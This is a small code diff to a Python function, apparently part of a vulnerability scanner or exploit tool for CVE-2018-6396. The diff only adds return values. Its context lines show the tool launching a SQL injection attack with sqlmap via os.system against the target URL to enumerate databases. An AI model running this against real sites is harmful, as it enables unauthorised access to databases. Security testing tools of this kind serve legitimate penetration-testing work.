@@ -95,6 +95,8 @@ def scan_cve_2018_6396(profile_url):
         print(Colors.BOLD + Colors.GREEN + "[+]" + " LAUNCHING ATTACK SQLi with SQLmap!!" + Colors.ENDC)
         exploit_command = f'sqlmap -u "{profile_url + P}" -p map --dbs'
         os.system(exploit_command)
+        return True
     else:
         print(Colors.BOLD + Colors.RED + "[-]" + " TARGET " + Colors.YELLOW + profile_url + Colors.RED + " NOT VULNERABLE!! :(" + Colors.ENDC)
+        return False
 
